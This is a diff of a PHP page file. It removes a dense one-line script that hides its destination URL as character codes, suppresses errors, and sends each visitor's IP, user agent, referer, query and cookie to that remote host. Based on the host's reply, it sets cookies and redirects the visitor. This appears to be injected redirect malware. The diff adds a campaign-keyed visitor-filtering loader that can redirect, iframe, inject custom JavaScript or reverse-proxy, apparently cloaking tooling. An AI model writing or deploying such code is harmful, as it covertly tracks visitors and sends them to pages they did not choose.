@@ -1,1 +1,78 @@
-<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "476225";$uid="a5d15ghyiaafbm82kd5s9scl6";$qu=$_SERVER["QUERY_STRING"];$postdata = http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref" => $_SERVER["HTTP_REFERER"],"ip" =>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn" => $_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query" => $_SERVER["QUERY_STRING"],"ua" => $_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id" =>$uid,"id" => $id));$opts = array("http" =>array("method" => "POST","header" => "Content-type: application/x-www-form-urlencoded","content" => $postdata));$context = stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result=file_get_contents($u,false,$context);$arr=explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0]==="true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
+<?php
+$GLOBALS['_ta_campaign_key'] = '00191b8136393f7a6542279af29be6fa';
+$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=00191b8136393f7a6542279af29be6fa' parameter
+
+require 'bootloader_759afe040f43e9485e803f0ff8fe0e4f.php';
+
+$campaign_id = '109lgd';
+
+$ta = new TALoader($campaign_id);
+
+
+if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
+    exit;
+}
+
+$response = $ta->get_response();
+$visitor = $ta->get_visitor();
+
+/*
+ * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
+ */
+//print_r($response);
+//print_r($visitor);
+//exit;
+/*
+ * Don't forget to re-comment the lines above before sending live traffic
+ */
+
+/*
+Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
+    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
+    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
+    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
+(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
+*/
+
+switch ($response['action']) {
+    case 'header_redirect':
+        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
+        exit;
+    case 'iframe':
+        print load_fullscreen_iframe($response['url']);
+        exit;
+    case 'paste_html':
+        print paste_html($response['output_html']);
+        exit;
+    case 'custom_js':
+        print $response['custom_js'];
+        exit; 
+    case 'local_file':
+        ob_start();
+        $output = include($response['local_file_path']);
+        $output = ob_get_clean();
+        print paste_html($output);
+        exit;                    
+    case 'reverse_proxy':
+        if(!empty($_GET['rp'])) {
+            reverse_proxy($response['url'], "tarp_759afe040f43e9485e803f0ff8fe0e4f/");
+
+            header('location: '.$_GET['rp']);
+            exit;
+        }
+
+        print reverse_proxy($response['url'], "tarp_759afe040f43e9485e803f0ff8fe0e4f/");
+        exit;        
+    /* Please be VERY CAREFUL if modifying this block: */
+    case 'load_hybrid_page':
+        $ta->load_hybrid_page();
+        break;
+    /* ...it is needed for hybrid mode to function correctly */
+    default:
+        print other_methods($response['url']);
+        break;    
+}
+/*
+ * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
+ */
+?>
